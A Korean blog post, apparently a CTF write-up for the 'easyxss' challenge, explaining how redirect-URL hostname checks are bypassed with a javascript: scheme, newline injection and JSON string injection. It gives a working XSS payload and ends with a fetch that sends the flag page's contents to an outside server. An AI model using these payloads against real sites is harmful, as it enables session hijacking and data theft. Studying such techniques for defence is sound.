---
title: ["Bypassing XSS Filters"]
date: 2025-01-24 09:00:00 +0900
categories: [techniques, XSS]
tags: [web, xss, bypassing filters]
---

Pocas님이 출제하신 easyxss를 풀고 관련된 개념을 정리하려고 한다.    

> 가끔 웹 서비스를 사용하다 보면 로그인, 로그아웃을 포함한 여러 로직에서 ret_url, redirect_url, return_url, url과 같은 파라미터 값을 가져와서 로그인 성공 및 로그아웃 성공 시에 해당 url로 리다이렉션 시켜주는 경우가 많습니다.  
하지만 리다이렉션 url을 서버 단에서 검증 할 때, hostname만 검증 하는 경우를 많이 보았습니다. 이와 같이 hostname만 검증을 할 경우에는 javascript 스킴을 이용해서 hostname을 우회해 XSS 취약점이 발생할 수 있습니다.  
실제로도 스타벅스 웹 사이트를 포함한 여러 사이트에서 발생한 것을 검색을 통해 확인할 수 있으며 얼마 전 카카오 사이트에서도 트리거가 되었습니다.  


## Trigger Point
```javascript
router.get('/', (req, res) => {
    const blog = req.query.blog || 'https://pocas.kr';
    const user = JSON.parse(`{"username":"Tester", "setblog":"${blog}"}`);
    const url = parse(user['setblog'], true)
    , hostname = url.hostname;

    if ((hostname === 'web-noob.kr' && user['username'] === 'hello') || (hostname === 'web-noob.kr' && username === 'world')) {
        console.log(1)
        res.render('index', {url:url});
    } else {
        res.render('index', {url:'#'});
    }
});
```
주요 취약점 포인트이다.  
`blog` 파라미터로 JSON string Injection이 가능하다.  
`hostname` 값 검증을 통과해야 하므로 hostname spoofing을 해야한다. 

## XSS
`url-parse` 모듈에서 `javascript://web-noob.kr`과 같은 입력은 `javascript`를 scheme으로 `web-noob.kr`은 hostname으로 파싱된다.  
`url-parse` 모듈과 페이지 렌더링 방식의 차이를 이용해서 XSS를 트리거시킬 수 있다.  

```
?blog=javascript://web-noob.kr/%250aalert(1);%22%2C%22username%22%3A%22hello
```
위와 같은 입력값에 대해서 `url-parse`모듈은 hostname을 `web-noob.kr`로 인식하지만,  
`url.href`가 해당값을 렌더링할 때는 `//`가 주석으로 처리되어 줄바꿈으로 다음 명령어를 실행하도록 한다.
```
javascript:
//web-noob.kr/
alert(1);
```

만약 `%0a`, `%0d` 등이 필터링되는 경우, `U+2028`과 같은 line separator를 사용할 수도 있다.

이후에는 CSP 설정으로 bot의 쿠키값을 직접 전송은 불가하고, bot이 flag 페이지에 접속하여 response 값을 서버로 전송하는 방식으로 페이로드를 구성하였다.  

```javascript
fetch('/flag').then(res=>res.text()).then(text=>{fetch('https://my-server.com',{'method':'POST','body':text})})
```